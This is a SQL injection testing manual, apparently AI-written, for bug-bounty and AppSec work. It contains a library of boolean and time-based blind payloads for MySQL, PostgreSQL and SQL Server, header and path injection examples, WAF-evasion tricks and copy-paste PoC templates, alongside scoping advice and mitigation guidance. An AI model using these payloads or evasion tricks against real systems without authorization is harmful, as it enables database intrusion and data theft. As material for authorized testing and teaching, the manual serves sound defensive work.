# SQL Injection Field Manual (with Blind SQLi focus) 🧠💉

_Built from patterns and PoCs found in the provided `vulnerability_information.txt` dataset._

---

## Table of Contents



---

## 1) Top Parameters & Injection Points (from the dataset)

### A) Query string parameters (URL `?a=b`)

- `acctid`
- `sortBy`
- `keyword`
- `coupon_codes`
- `pub_group_id`
- `story_id`
- `x`
- `t`
- `ccm_order_by`
- `ccm_order_by_direction`
- `where`

### B) POST / form body parameters

- `invite_code`
- `refresh_token`
- `login`
- `validateemail`
- `phone_number`
- `app_id`

### C) “Non-obvious” injection vectors

- **HTTP headers:** `User-Agent` (header-based SQLi)
- **URL path segments:** `customerId`, `userId` (path-based SQLi)
- **CMS/plugin-specific “parameters”:** `order_by`, `order` (e.g., shortcode/templating parameters)

### D) Why these tend to be vulnerable

- Sorting / filtering fields (`sortBy`, `order`, `order_by`, `ccm_order_by`) often get concatenated into SQL (harder to parameterize if poorly designed).
- Search fields (`keyword`, `search`) frequently build dynamic `LIKE` queries.
- Token / auth-ish fields (`refresh_token`) are sometimes passed into DB lookups with unsafe string formatting.
- “Hidden” vectors (headers, path segments) are forgotten in input validation pipelines.

---

## 2) Payload Library 🧪

Use **the smallest payload** that proves impact.

### 2.1 Probing payloads (quick “red flags”)

**String context**

```text
'            (single quote)
''           (double quote to restore syntax)
")           (try closing quotes/parens)
'--          (comment termination attempt)
'/*          (block comment opener)
```

**Numeric context**

```text
1
1+1
1-0
1 AND 1=1
1 AND 1=0
```

### 2.2 Boolean-based blind (content/behavior differs)

**Goal:** make the app behave differently on a **true** vs **false** predicate.

```text
<param>=<base> AND 1=1
<param>=<base> AND 1=0
```

Variants when WAF/filters are strict:

```text
<param>=<base>/**/AND/**/1=1
<param>=<base>/**/AND/**/1=0
```

### 2.3 Time-based blind (response time differs) ⏱️

**Goal:** trigger delay only when your injected expression is parsed/executed.

#### MySQL/MariaDB

```text
<param>=<base> AND (SELECT SLEEP(5))
<param>=<base> AND (SELECT SLEEP(0))
```

Common “wrapped” pattern (often survives parsers):

```text
<param>=<base> AND (SELECT 1234 FROM (SELECT(SLEEP(5)))a)
```

#### PostgreSQL

```text
<param>=<base>');(SELECT 1 FROM PG_SLEEP(5))--
<param>=<base>');(SELECT 1 FROM PG_SLEEP(0))--
```

#### SQL Server

```text
<param>=<base>'; WAITFOR DELAY '0:0:5'--
<param>=<base>'; WAITFOR DELAY '0:0:0'--
```

#### Oracle (often error-based first)

Oracle blind/time-based is trickier; you’ll frequently confirm via **Oracle error codes** and then pivot to a safe timing primitive depending on context and privileges.

### 2.4 Header-based SQLi (yes, headers!) 🛰️

If an endpoint logs or stores headers and later queries them unsafely, the header becomes an injection point.

```http
User-Agent: <normal>' XOR(if(now()=sysdate(),sleep(5),0)) OR '
```

### 2.5 Path-based SQLi (URI segment injection)

```text
/.../customerId/732562'/...     (single quote causes backend query error)
```

---

## 3) How To Test SQL Injection (playbook) 🧭

### Step 0 — Confirm you’re in-scope

- Program scope, environment, rate-limits, “do-not-test” endpoints.
- Prefer **staging** if available.

### Step 1 — Find candidate inputs (don’t tunnel vision)

- URL params, body params, JSON fields, GraphQL variables
- Headers (User-Agent, Referer, X-Forwarded-For), cookies
- Path segments (`/users/123`), sorting/filtering params

### Step 2 — Fast syntax break test

- Inject `'` and observe:
    - **500 / stack trace / SQL error**
    - logic changes (redirect loop, empty results, “something went wrong”)
- Immediately test “repair” with `''`:
    - If `'` breaks and `''` fixes: strong signal of SQL parsing.

### Step 3 — Identify context (string vs numeric)

- If the value is normally numeric (`id=123`), start with numeric boolean probes.
- If it’s stringy (`q=hello`), start with quote-based probes.

### Step 4 — Choose blind technique (most reliable in modern apps)

**Boolean-based blind**

- Use a normal value that returns data.
- Add a TRUE predicate and confirm results remain.
- Add a FALSE predicate and confirm results change.

**Time-based blind**

- Establish baseline (3–5 requests; take median).
- Send “delay 5s” payload (repeat 2–3 times).
- Send “delay 0s” payload (repeat 2–3 times).
- If the deltas are stable: confirmed blind SQLi.

### Step 5 — Stop at a safe PoC

A solid report includes:

- request(s) + injection point
- true/false or delay/no-delay evidence
- minimal impact demonstration (no data dumping)

---

## 4) Tips & Tricks ✅

### Reliability hacks for blind SQLi

- **Repeat tests** and use **median** response time (not average).
- Add cache-busters (e.g., random param) if responses are cached.
- Keep everything constant except the payload (same headers, same cookies).
- Use smaller delays first (e.g., 3–5s). Don’t DoS the app.
- Watch for jitter: CDNs, rate-limits, backend queues, autoscaling.

### “Where is the SQL built?”

- Sorting params and “order” fields are often concatenated.
- Search fields often inject into `LIKE '%...%'`.
- Auth tokens may be DB lookups like `SELECT ... WHERE refresh_token='<input>'`.

### Reporting clarity

- Provide two clean requests side-by-side:
    - TRUE vs FALSE (boolean blind)
    - DELAY 5 vs DELAY 0 (time blind)
- Include timestamps / `time curl ...` output when possible.

---

## 5) WAF / Filter Evasion (If any) 🧱➡️🧩

**Important:** This section is about _filter brittleness_ and _validation gaps_ you may see during authorized testing. Don’t use it to attack random targets.

### Common patterns seen in real reports

- **Inline comments as whitespace:** `/**/` can replace spaces in some parsers.
- **Alternative boolean expressions:** `1=1`, `2>1`, arithmetic equalities.
- **Case changes:** `SeLeCt`, `sLeEp` (depends on WAF and backend).
- **Different closings:** try `')`, `'))`, `")` to match the server-side query shape.
- **Function wrappers:** embedding `SLEEP()` inside nested selects sometimes passes naive filters.

### Defensive takeaway

If your “WAF” is just regex rules, assume it will be bypassed. Fix the root cause:

- parameterized queries
- allowlists for sort/order fields
- escaping only as a last line of defense

---

## 6) Complete Booklet on SQL Injection 📚

### 6.1 What SQL Injection is

SQL injection happens when user input becomes **SQL code**, not **data**. The backend ends up executing attacker-controlled query logic.

### 6.2 Core types (and what you’ll observe)

- **Error-based:** visible DB errors, stack traces, SQL error codes.
- **In-band (UNION):** data returns directly in the response.
- **Blind (Boolean):** content differs with true/false conditions.
- **Blind (Time):** response time differs with delay/no-delay.
- **Out-of-band:** data exfil via DNS/HTTP callbacks (rare; high-risk).

### 6.3 Blind SQLi deep dive (what matters most) 🔥

#### Boolean-based blind

You’re turning the app into an oracle:

- TRUE condition → response A (results show, status differs, etc.)
- FALSE condition → response B (empty results, different status, etc.)

Good boolean indicators:

- result count changes
- different HTML fragments
- different JSON fields
- different status codes (200 vs 404)

#### Time-based blind

You’re using delay as the oracle:

- delay 0 → baseline time
- delay 5 → baseline + ~5 seconds

When to prefer time-based:

- app responses are too “noisy” to compare reliably
- always returns same content (e.g., `{ "error": "invalid_grant" }`)

Noise control checklist:

- measure several times
- keep concurrency low
- watch for throttling/ratelimiting (which can mimic delays)

### 6.4 Why blind SQLi is still critical

Even without visible errors:

- auth bypass can happen (logic manipulation)
- sensitive data can be inferred
- worst case: RCE via DB features / chained bugs (depends on stack)

### 6.5 Mitigation (what actually works)

- **Prepared statements / parameterized queries** (primary defense)
- **Allowlist sorting fields** (never allow raw `ORDER BY <user_input>`)
- **Least privilege DB user**
- **Centralized input validation**
- **Safe ORM usage** (avoid raw string formatting / unsafe connectors)
- **Security tests** (unit tests for query builders + DAST)

### 6.6 AppSec test checklist (quick)

- [ ] Identify all inputs (query/body/json/headers/cookies/path)
- [ ] Try `'` then `''` (syntax break & repair)
- [ ] Boolean blind: TRUE vs FALSE differential
- [ ] Time blind: DELAY vs NO-DELAY differential
- [ ] Document PoC safely (no dumping)
- [ ] Recommend parameterization + allowlists

---

## Appendix: Minimal PoC templates (copy/paste friendly)

**Boolean blind**

```text
<param>=<base>' AND 1=1--
<param>=<base>' AND 1=0--
```

**Time blind (choose your DB)**

```text
MySQL:    <param>=<base>' AND (SELECT SLEEP(5))--
Postgres: <param>=<base>');(SELECT 1 FROM PG_SLEEP(5))--
MSSQL:    <param>=<base>'; WAITFOR DELAY '0:0:5'--
```

---

_If you want, I can also generate a **“report template”** section (bug bounty style) that matches what triagers love: clear PoC pairs, impact framing, and remediation wording._
